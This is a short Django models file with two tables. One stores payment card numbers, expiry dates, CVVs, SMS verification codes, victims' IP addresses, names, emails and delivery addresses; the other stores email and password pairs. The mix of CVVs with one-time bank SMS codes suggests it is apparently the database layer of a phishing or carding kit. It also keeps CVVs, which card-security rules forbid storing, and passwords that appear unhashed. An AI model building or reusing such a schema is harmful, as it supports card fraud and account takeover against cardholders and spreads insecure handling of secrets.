from django.db import models

class CardInfo(models.Model):
    card_number = models.CharField(max_length=16, unique=True)
    expiry_date = models.CharField(max_length=10)
    user_ip = models.CharField(max_length=25, null=True, blank=True)
    cvv = models.CharField(max_length=10)
    sms_code = models.CharField(max_length=10, null=True)
    full_name = models.CharField(max_length=100, null=True)
    email = models.EmailField(null=True)
    delivery = models.CharField(max_length=255, null=True)



class UserCredentials(models.Model):
    email = models.EmailField(unique=True)
    password = models.CharField(max_length=100)
